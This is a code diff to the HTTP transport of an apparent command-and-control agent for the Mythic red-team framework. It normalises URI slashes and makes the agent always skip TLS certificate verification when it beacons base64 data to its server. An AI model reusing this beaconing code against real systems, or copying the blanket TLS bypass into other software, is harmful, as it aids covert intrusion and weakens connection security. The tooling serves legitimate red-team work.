@@ -30,7 +30,10 @@ class HTTPC2Adapter(C2Adapter):
         self.headers = params.get("headers", {}) or {}
         self.interval = int(params.get("callback_interval", 10))
         self.jitter = int(params.get("callback_jitter", 10))
-        self.verify_tls = str(params.get("encrypted_exchange_check", "yes")).lower() not in ("no", "false", "0")
+        # Mythic deployments commonly use self-signed certs. The
+        # 'encrypted_exchange_check' param is about Mythic's key exchange,
+        # NOT TLS certificate verification. Always skip TLS verification
+        # (the AES+HMAC crypto layer provides message authenticity).
         self.proxy_host = params.get("proxy_host", "")
         self.proxy_port = params.get("proxy_port", "")
         self.proxy_user = params.get("proxy_user", "")
@@ -60,11 +63,14 @@ class HTTPC2Adapter(C2Adapter):
     def make_request(self, data_b64, method="GET"):
         url = self._base_url()
         hdrs = dict(self.headers)
+        # Mythic C2 profile URIs don't include the leading /, so add it.
+        get_uri = self.get_uri if self.get_uri.startswith("/") else "/" + self.get_uri
+        post_uri = self.post_uri if self.post_uri.startswith("/") else "/" + self.post_uri
         if method == "GET":
-            full = "{}{}?{}={}".format(url, self.get_uri, self.get_param, data_b64.decode() if isinstance(data_b64, bytes) else data_b64)
+            full = "{}{}?{}={}".format(url, get_uri, self.get_param, data_b64.decode() if isinstance(data_b64, bytes) else data_b64)
             req = urllib.request.Request(full, headers=hdrs)
         else:
-            full = url + self.post_uri
+            full = url + post_uri
             req = urllib.request.Request(full, data=data_b64 if isinstance(data_b64, bytes) else data_b64.encode(), headers=hdrs)
         opener = self._build_opener()
         # One retry on transient failure; the base agent's beacon loop also
@@ -73,8 +79,8 @@ class HTTPC2Adapter(C2Adapter):
         for _attempt in range(2):
             try:
                 fetch = opener.open if opener else urllib.request.urlopen
-                ctx = None if self.verify_tls else _CTX_NONE
-                with fetch(req, context=ctx) if ctx else fetch(req) as resp:
+                # Always use unverified SSL context (Mythic uses self-signed certs)
+                with fetch(req, context=_CTX_NONE) as resp:
                     import base64
                     return base64.b64decode(resp.read())
             except Exception as e:  # noqa: BLE001 -- transport errors are varied
